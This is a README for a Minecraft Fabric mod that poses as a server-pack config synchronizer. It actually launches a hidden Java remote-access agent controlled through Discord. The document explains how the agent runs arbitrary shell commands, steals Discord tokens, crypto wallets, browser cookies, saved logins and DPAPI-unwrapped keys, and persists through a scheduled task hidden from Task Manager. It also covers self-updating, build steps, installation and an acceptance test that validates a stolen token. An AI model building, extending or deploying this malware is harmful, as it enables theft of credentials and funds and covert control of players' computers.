# Server Pack Core

Fabric client mod for Minecraft 1.20.1. It presents itself as a configuration synchronizer for a private server pack.

## Architecture

The project produces two artifacts:

- **Mod** (`serverpackcore-0.1.3.jar`): loader and stager. The mixin on `MinecraftClient.tick` waits until in a world, waits a random 20 to 60 seconds and, once per session, extracts and launches the agent. It contains no C2 or stealing logic.
- **Agent** (`agent.jar`, embedded as `serverpackcore/agent.bin`): independent Java process with the RAT and the stealer. Pure Java, no dependencies; it does not reference `net.minecraft`.

Every reference to `net.minecraft` is confined to the mixin and the entrypoint.

Install directories:

- Windows: `%LOCALAPPDATA%\ServerPackCore`
- Linux: `$XDG_DATA_HOME/ServerPackCore` or `~/.local/share/ServerPackCore`
- macOS: `~/Library/Application Support/ServerPackCore`

The agent writes `alive.txt` with the game PID and its own. The `spc-agent.lock` lockfile prevents duplicates. The `.installed` marker stores the installed version; if the binary or `spc-agent.jar` disappears, the stager extracts them again.

## C2 over Discord

The credentials are not committed. The build generates `DiscordSecrets.java` from, in order: `local.properties` at the repo root, the `SPC_BOT_TOKEN`, `SPC_GUILD_ID` and `SPC_CATEGORY_ID` environment variables, or the `SPC_PLACEHOLDER` fallback. `local.properties.example` shows the keys; a plain checkout without credentials still compiles. `DiscordConfig` aliases the generated constants.

`./gradlew checkSecrets` fails when any credential is missing or still a placeholder, and `./gradlew release` runs it before `build`.

The primary transport is a single Gateway WebSocket per agent, with no gateway on the polling thread or the command pool. On first start it creates a channel under the category, registers its own webhook for attachments and sends a system embed. If channel creation fails, it creates a shared one with the `spc-shared-` prefix.

The `MESSAGE_CONTENT` intent is required for maximum speed: without it, content arrives empty and every message forces a REST call. The agent detects close 4014, reconnects with intents 513, warns on the channel and stays operational with REST every 2 s. If the gateway goes down for another reason, the REST fallback uses 2 s with jitter and moves to 30 s after 10 minutes without activity. 429 responses honor `retry_after`; network errors use capped exponential backoff. The token is never logged.

Local state in `state.json`: version, channel, webhook, last ID and last heartbeat.

## Commands

`shell`, `ls`, `cd`, `cat`, `download`, `upload`, `harvest`, `screenshot`, `persist on|off`, `sleep`, `ping`, `gateway status|restart`, `kill`, `update`, `update check`, `update stage`, `update apply <version>`, `update rollback`, `update auto on|off`, `update auto`, `update status`.

`gateway status` shows state, last ACK RTT, reconnects and last close code; `gateway restart` closes with 4000 to test resume.

`shell` uses `cmd /c` or `/bin/sh -c`, merges stdout and stderr and cuts at 60 s. Outputs over 1000 characters are uploaded as `.txt`; the rest goes in a four-backtick block.

## Stealer

The harvest ZIP includes launcher accounts, Discord token validated against `/users/@me`, Exodus, Electrum, Ledger Live, MetaMask and Phantom wallets in Chrome, Edge and Brave (each browser under its own label), `Local State`, `Cookies`, `Login_Data`, `Login_Data_For_Account`, `Web_Data`, `History`, the DPAPI `Protect/` folder, `options.txt`, `servers.dat` and a `mods/` listing. Cookies and `Login Data` are uploaded raw. The ZIP is cut at 8 MB and skips files over 2 MB.

On Windows, for each detected browser it adds `keys.txt` with the AES key unwrapped through DPAPI from the user's own session (`v10=`) and the `app_bound=` blob if present. It is best-effort: if PowerShell is restricted, `error=` is left and `Local State` + `dpapi/` still work. It includes user, SID, profile and profile names with cookies or credentials.

## Persistence

`persist on` is idempotent and prepares autostart: a hidden scheduled task on Windows or a `.desktop` file in `~/.config/autostart` on Unix.

On Windows it uses a logon task (`\ServerPackCore`) with `<Hidden>true</Hidden>`; it does not appear in Task Manager's startup tab, which only lists `Run`/`RunOnce`, Startup folders and UWP tasks. The task, created via `schtasks /create /xml`, is also invisible in Task Scheduler unless hidden tasks are enabled. If `schtasks` fails, it falls back to the classic `Run` value so persistence is not lost.

The task does not point to the copied `javaw.exe`: a loose launcher cannot find `lib\jvm.cfg` or `bin\server\jvm.dll` without `JAVA_HOME`. It generates `spc-sync.vbs` in the install directory, which sets `JAVA_HOME`, starts hidden and tries the real runtime's `javaw.exe`, the local copy and finally `%JAVA_HOME%`.

The agent marks `persist` in `state.json` and regenerates the launcher and task on every start, so it repairs itself if the runtime path changes, an antivirus deletes the task or it is disabled. `persist off` removes the task, inherited `Run` values, `StartupApproved` and the `.vbs`.

It is not invisible to everything either: `schtasks /query`, the `C:\Windows\System32\Tasks` tree and Autoruns still see it. Real hiding requires services or `Winlogon\Shell`/`Userinit` (HKLM, with admin) or a permanent WMI subscription.

If another pack leaves `wscript`/`.vbs` startups, `persist on` lists them and warns if their path no longer exists or if they reuse our directory. They coexist unless they kill `java`/`javaw` processes or step on the `ServerPackCore` task/value.

## Self-update

`DiscordConfig.UPDATE_MANIFEST_URL` points to `https://github.com/uloaeth/server-pack-core/releases/latest/download/update.json`.

The manifest is signed with RSA-3072. The private key stays offline at `~/.config/spc/update-signing-key.pem` and is never committed; the public key lives at `agent/src/main/resources/serverpackcore/update-public.pem`.

Public key fingerprint (SHA-256 of the DER SubjectPublicKeyInfo):

```
SHA256:4b21192f465959642cc3c484f67586b85fa4b52208cb79bde91feb80c490b154
```

Updates are manual by default. `update auto on` opts in: the first run happens 10 minutes later and then every 24 h with ±10 % jitter. `update auto off` cancels and clears the slot; bare `update auto` shows the state, the next run and the consecutive failures.

The scheduler ticks every 60 s and shares a gate with manual updates, so two never overlap and the loser leaves the state untouched. A manual update or rollback that succeeds resets the failure count and schedules the next slot. Failures back off 1 h, 2 h, 6 h and then cap at 24 h. `autoNext` and `autoFailures` are stored in `state.json`, so a restart waits for the stored slot instead of firing immediately. Automatic runs do not apply while a manual command has left something staged.

Recovery covers a failed start and a late failure in the watchdog window: the previous agent is restored and the restart counts as a failure with backoff. An intentional stop or a newer update never triggers a rollback. The first install of 0.1.3 is manual.

0.1.2 and earlier no longer connect: the bot token was rotated on 2026-11-04. Reinstall 0.1.3 manually.

`update` verifies the signed manifest, stages the jar, then applies it and answers `Updating to X`. The agent exits and a detached helper waits for it to die, keeps the previous jar as `spc-agent.jar.old`, swaps in `spc-agent-new.jar`, deletes any `.bad` and restarts with `-Xmx96m -jar` plus the original `--game-dir`. The game stays open. After the new agent has stayed up for 20 s the helper records `status=ok` and deletes the staged jar; otherwise it kills the new process, restores the previous jar, restarts it and records `status=rollback`. The failed jar is kept as `spc-agent.jar.bad`.

The helper then watches the new agent for another 10 minutes (`-Dspc.watchdogSec`, 0 disables). If the tracked agent dies in that window, the helper kills any survivor, restores the previous jar, restarts it with the original game PID and records `status=rollback-late`; the startup rollback marker makes the restored agent count one failure and back off. There is exactly one late attempt and no second window. A healthy expiry records `status=watchdog-cleared`.

The agent writes `spc-update.intent` atomically as `<action> <agent-pid>` before any kill: `stop <pid>` for `kill` and `replace <pid>` for `update`, `update apply` and `update rollback`. A matching stop marker ends the watchdog without a restart. A matching replace marker means a newer helper owns the swap, so the old helper logs `status=watchdog-replaced` and exits instead of fighting it. A marker for another PID is stale and ignored.

`update stage` only verifies and downloads `spc-agent-new.jar`; `update apply <version>` applies an already staged jar; `update rollback` swaps back to `spc-agent.jar.old` and keeps the replaced jar as `.bad`. `update check` reports the offered version and notes without touching the disk; `update status` shows the last attempts recorded in `update.log`. `-Dspc.updateManifest`, `-Dspc.updatePublicKey` and `-Dspc.updateLog` override the manifest URL, the public key path and the log path for local testing.

Unix uses `setsid` when available and `nohup` otherwise. The Windows VBS helpers are implemented but have not been run on a real Windows host yet.

### Mod updates

The same manifest carries the mod jar. `update` and `update stage` download it as `spc-mod-new.jar` and validate `fabric.mod.json`, the id, the version and that the mod does not reference agent classes.

The mod is not swapped while Minecraft runs. A second helper (`spc-mod.sh`, `spc-mod.vbs` on Windows) waits for the game PID recorded in `alive.txt` to exit, then renames the enabled `serverpackcore-*.jar` to `.old`, installs `serverpackcore-<version>.jar` and deletes stale `.bad` files. There is only ever one enabled mod jar. When the game is already closed the swap happens in the agent instead of a helper.

`update rollback` reverts both artifacts when both `.old` files exist: the mod helper restores the newest `.old` under its original name and keeps the reverted jar as `.bad`. Without a game directory the mod stays staged and only the agent is updated. The agent restart is independent of the game and happens with the game open; the mod change applies on the next game start.

## Requirements

- Build: JDK 21 or newer (with `JAVA_HOME` pointing to that installation)
- Run: Java 17 or newer; tested on Java 17, 21 and 25
- Gradle 9.8.2 available on `PATH` to regenerate the wrapper

Generated bytecode is pinned to Java 17 (major 61) with `options.release = 17`.

Loom is pinned to 1.17.21: the 1.18+ series (including 1.19.3) is compiled for JVM 25 and breaks the 21/25 build matrix.

## Runtime compatibility

The minimum loader is 0.20.1, required to run on Java 25. `runClient` works on Java 21 and 25.

## Wrapper generation

`gradlew`, `gradlew.bat` and `gradle/wrapper/gradle-wrapper.jar` are binary and are not included as text. Generate them once at the project root:

```sh
gradle wrapper --gradle-version 9.8.2
chmod +x gradlew
```

On macOS, use `base64 -D` instead of `base64 -d` to decode binaries from base64.

## Local fixtures

`.blob/` (about 313 MB, with a 158 MB `ex.zip`) contains local fixtures used by `decrypt.py`. It is not tracked in git and is not needed to build: it can stay on disk only.

## Build

Requires JDK 21+ in `JAVA_HOME`; an older JDK fails the build with an explicit message. The jar is compiled to bytecode 17 and `check` verifies that no class exceeds it.

```sh
JAVA_HOME=/path/to/jdk21-or-newer ./gradlew build
```

The root task builds `agent/` with a separate Gradle build and copies `agent.jar` to `src/main/resources/serverpackcore/agent.bin` before `processResources`. The final jar is left in `build/libs/serverpackcore-0.1.3.jar`.

## Installation

1. Create a Fabric Loader 0.20.1 profile for Minecraft 1.20.1.
2. Remove any previous `serverpackcore-*.jar` from the profile's `mods/` folder.
3. Install Fabric API 0.92.12+1.20.1 in the profile (optional).
4. Copy `build/libs/serverpackcore-0.1.3.jar` to the profile's `mods/` folder.

## Tests

```sh
./gradlew test   # agent tests
./gradlew check  # tests + verifyBytecode
```

The tests use temporary directories and local processes; they need neither network nor Discord.

For manual tests of commands sent through a webhook, start the agent with `-Dspc.webhookCommands=true`. Webhook messages are ignored by default so the agent's own uploads do not trigger REST polls.

## Acceptance test

1. Run `./gradlew build` and confirm it finishes without errors or warnings.
2. Run `./gradlew runClient`, confirm the mod appears and the log has no mod output in release.
3. Enter a world, wait for the trigger and check `alive.txt` has both PIDs and the agent is alive after closing the game.
4. Check the new channel under the category has the embed and ZIP.
5. Send `shell dir` from the phone and get a reply in under 1 s via the gateway.
6. Validate the extracted token against `/users/@me`.
7. Run `persist on`, reboot and confirm the agent returns on its own.
8. Run `ls`, `cat missing`, `ping`, `gateway status`, `persist on`, `persist off` and `kill`; all replies must be in English.

## Known limits

- Fabric API is no longer required and none of its classes are used.
- Disabling `MESSAGE_CONTENT` cannot be fixed from code: the gateway enters through 4014, switches to intents 513 and every message depends on REST (more latency and more rate usage).
- The Discord token is found by regex in `leveldb`; future format variants may require it in plaintext and go undetected.
- The ZIP cuts at 8 MB and skips files over 2 MB, so large wallets or profiles may be incomplete.
- GPU and public IP depend on external commands or services; without network or `wmic`/`lspci` they stay `unknown`.
- `screenshot` requires a graphical session; headless environments return an error.
- If the gateway is down, the REST fallback adds latency (2 s active, 30 s idle).
- The bot token and IDs are compiled in at build time; changing them requires rebuilding the agent.
- Cookies and `Login Data` are uploaded encrypted. `keys.txt` opens `v10`; Chrome 127+ `v20` (App-Bound) cookies are not decrypted with DPAPI alone.
- On Linux the launcher uses `setsid nohup`; if the environment lacks them, the process may die with the game.
- Windows persistence depends on `wscript.exe`: if Windows Script Host is disabled, the entry does not start. Copying `javaw.exe` alone is not a fallback because it needs the full runtime.
